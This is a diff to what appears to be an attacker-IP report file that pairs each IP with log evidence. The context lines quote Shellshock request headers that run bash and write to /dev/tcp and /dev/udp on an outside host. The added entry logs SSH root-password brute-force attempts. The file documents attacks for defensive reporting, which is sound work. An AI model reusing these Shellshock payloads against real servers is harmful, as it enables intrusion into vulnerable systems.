@@ -77,3 +77,15 @@ ips:
         "129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] \"GET /phppath/cgi_wrapper? HTTP/1.1\" 404 162 \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/phppath/cgi_wrapper? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80\x22\" \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/phppath/cgi_wrapper? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/cgi_wrapper? > /dev/udp/213.233.161.42/80\x22\""
         "129.121.182.100 - - [27/Feb/2015:10:06:34 +0000] \"GET /phppath/php? HTTP/1.1\" 404 162 \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/phppath/php? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/php? > /dev/udp/213.233.161.42/80\x22\" \"() { :;}; /bin/bash -c \x22echo CADOTH.NET/phppath/php? > /dev/tcp/213.233.161.42/23; echo CADOTH.NET/phppath/php? > /dev/udp/213.233.161.42/80\x22\""
   ]
+  '202.202.113.159':
+    categories: ['login_finder', 'attacks.22']
+    proof:
+      type: "syslog"
+      contents: [
+            "Jun 11 09:55:29 cadoth sshd[3699]: Failed password for root from 202.202.113.159 port 33135 ssh2"
+            "Jun 11 09:55:35 cadoth sshd[3701]: Failed password for root from 202.202.113.159 port 38905 ssh2"
+            "Jun 11 09:55:40 cadoth sshd[3703]: Failed password for root from 202.202.113.159 port 45237 ssh2"
+            "Jun 11 09:55:45 cadoth sshd[3705]: Failed password for root from 202.202.113.159 port 50605 ssh2"
+            "Jun 11 09:55:50 cadoth sshd[3707]: Failed password for root from 202.202.113.159 port 56668 ssh2"
+            "Jun 11 09:55:55 cadoth sshd[3709]: Failed password for invalid user sm0k3y from 202.202.113.159 port 33826 ssh2"
+        ]
